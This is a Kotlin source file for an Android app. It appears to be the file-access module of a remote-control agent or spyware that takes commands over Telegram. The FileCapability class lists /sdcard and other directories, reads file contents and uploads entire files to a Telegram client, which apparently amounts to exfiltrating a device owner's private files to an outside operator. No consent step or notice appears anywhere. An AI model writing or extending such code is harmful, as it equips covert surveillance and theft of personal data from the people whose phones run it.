package com.example.agent.capabilities

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import androidx.core.content.ContextCompat
import com.example.agent.ErrorReporter
import com.example.agent.TelegramClient
import java.io.File

class FileCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun list(path: String) {
        if (!hasStoragePermission()) {
            telegram.sendText("❌ Storage permission denied")
            return
        }
        val dir = if (path.isEmpty()) File("/sdcard") else File(path)
        if (!dir.exists() || !dir.isDirectory) {
            telegram.sendText("❌ Invalid directory: $path")
            return
        }
        val files = dir.listFiles() ?: emptyArray()
        if (files.isEmpty()) {
            telegram.sendText("📁 Directory is empty: ${dir.absolutePath}")
            return
        }
        val sb = StringBuilder("📁 ${dir.absolutePath}\n━━━━━━━━━━━━━━━━\n")
        files.sortedBy { it.isDirectory }.take(100).forEach { file ->
            val type = if (file.isDirectory) "📂" else "📄"
            val size = if (file.isFile) " (${formatSize(file.length())})" else ""
            sb.appendLine("$type ${file.name}$size")
        }
        if (files.size > 100) sb.appendLine("...and ${files.size - 100} more")
        telegram.sendText(sb.toString())
    }

    fun read(path: String) {
        if (!hasStoragePermission()) {
            telegram.sendText("❌ Storage permission denied")
            return
        }
        val file = File(path)
        if (!file.exists() || !file.isFile) {
            telegram.sendText("❌ File not found: $path")
            return
        }
        if (file.length() > 100_000) {
            telegram.sendText("⚠️ File too large (${(file.length() / 1024)}KB), sending as file...")
            telegram.sendFile(file)
            return
        }
        try {
            val content = file.readText()
            val preview = if (content.length > 3500) content.take(3500) + "\n... (truncated)" else content
            telegram.sendText("📄 ${file.name}:\n$preview")
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot read file: ${e.message}")
        }
    }

    fun download(path: String) {
        if (!hasStoragePermission()) {
            telegram.sendText("❌ Storage permission denied")
            return
        }
        val file = File(path)
        if (!file.exists() || !file.isFile) {
            telegram.sendText("❌ File not found: $path")
            return
        }
        telegram.sendFile(file, "📄 ${file.name}")
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 -> "%.1fMB".format(bytes / (1024.0 * 1024.0))
            bytes >= 1024 -> "%.1fKB".format(bytes / 1024.0)
            else -> "${bytes}B"
        }
    }

    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.MANAGE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
}
